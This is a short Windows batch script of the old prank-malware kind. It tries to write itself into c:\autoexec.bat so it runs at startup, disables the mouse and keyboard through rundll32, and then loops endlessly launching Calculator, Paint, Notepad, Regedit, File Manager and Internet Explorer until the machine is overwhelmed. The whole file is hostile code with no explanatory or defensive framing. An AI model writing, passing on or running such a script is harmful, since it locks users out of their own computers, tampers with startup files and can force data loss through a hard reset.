@Echo Off
START Bah.bat >> c:\autoexec.bat
c:\windows\rundll32.exe mouse,disable
c:\windows\rundll32.exe keyboard,disable
:Bah
START Calc.Exe
START Pbrush.exe
START Notepad.exe
START Regedit.exe
START Winfile.exe
START Iexplore.exe
goto Bah